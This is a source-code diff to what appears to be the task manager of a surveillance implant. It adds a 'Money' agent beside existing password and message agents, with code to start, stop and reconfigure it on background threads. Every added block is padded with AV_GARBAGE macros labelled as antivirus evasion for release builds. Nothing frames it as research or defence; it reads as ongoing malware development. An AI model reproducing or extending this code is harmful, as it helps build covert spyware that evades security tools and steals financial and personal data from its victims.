@@ -25,6 +25,7 @@
 
 #import "RCSMAgentMessages.h"
 #import "RCSMAgentPassword.h"
+#import "RCSMAgentMoney.h"
 
 #import "NSMutableDictionary+ThreadSafe.h"
 
@@ -774,6 +775,44 @@ static NSLock *gSyncLock                  = nil;
   
   switch (agentID)
     {
+        case AGENT_MONEY:
+        {
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+#ifdef DEBUG_TASK_MANAGER
+            infoLog(@"Starting Agent Money");
+#endif
+            __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_001
+            
+            if (agentConfiguration == nil)
+            {
+#ifdef DEBUG_TASK_MANAGER
+                errorLog(@"Internal config for agent Money not found");
+#endif
+                return FALSE;
+            }
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_002
+            
+            [agentConfiguration setObject: AGENT_START
+                                   forKey: @"status"];
+            
+            [agentMoney setAgentConfiguration: agentConfiguration];
+            
+            // AV evasion: only on release build
+            AV_GARBAGE_003
+            
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentMoney
+                                   withObject: nil];
+        }
+            break;
         case AGENT_PASSWORD:
         {
             // AV evasion: only on release build
@@ -1884,6 +1923,42 @@ static NSLock *gSyncLock                  = nil;
   
   switch (agentID)
   {
+      case AGENT_MONEY:
+      {
+          // AV evasion: only on release build
+          AV_GARBAGE_009
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Stopping Agent Money");
+#endif
+          __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_008
+          
+          if ([agentMoney stop] == FALSE)
+          {
+#ifdef DEBUG_TASK_MANAGER
+              errorLog(@"Error while stopping agent Money");
+#endif
+              return NO;
+          }
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_007
+          
+          agentConfiguration = [self getConfigForAgent: agentID];
+          [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_006
+          
+#ifdef DEBUG_TASK_MANAGER
+          infoLog(@"Money stopped correctly");
+#endif
+
+      }
+          break;
       case AGENT_PASSWORD:
       {
    
@@ -2656,6 +2731,36 @@ static NSLock *gSyncLock                  = nil;
     {
       switch (agentID)
       {
+          case AGENT_MONEY:
+          {
+              // AV evasion: only on release build
+              AV_GARBAGE_000
+              
+              __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+              
+              if ([agentMoney stop] == FALSE)
+              {
+#ifdef DEBUG_TASK_MANAGER
+                  errorLog(@"Error while stopping agent Money");
+#endif
+                  //return NO;
+              }
+              else
+              {
+                  // AV evasion: only on release build
+                  AV_GARBAGE_007
+                  
+                  [anObject setObject: AGENT_STOPPED forKey: @"status"];
+              }
+#ifdef DEBUG_TASK_MANAGER
+              infoLog(@"Money stopped correctly");
+#endif
+
+          }
+              break;
           case AGENT_PASSWORD:
           {
               // AV evasion: only on release build
@@ -3241,6 +3346,29 @@ static NSLock *gSyncLock                  = nil;
         {
           switch (agentID)
             {
+                case AGENT_MONEY:
+                {
+                    // AV evasion: only on release build
+                    AV_GARBAGE_006
+                    
+                    __m_MAgentMoney *agentMoney = [__m_MAgentMoney sharedInstance];
+                    agentConfiguration = [[anObject objectForKey: @"data"] retain];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_007
+                    
+                    [anObject setObject: AGENT_START
+                                 forKey: @"status"];
+                    [agentMoney setAgentConfiguration: anObject];
+                    
+                    // AV evasion: only on release build
+                    AV_GARBAGE_004
+                    
+                    [NSThread detachNewThreadSelector: @selector(start)
+                                             toTarget: agentMoney
+                                           withObject: nil];
+                }
+                    break;
                 case AGENT_PASSWORD:
                 {
                     // AV evasion: only on release build
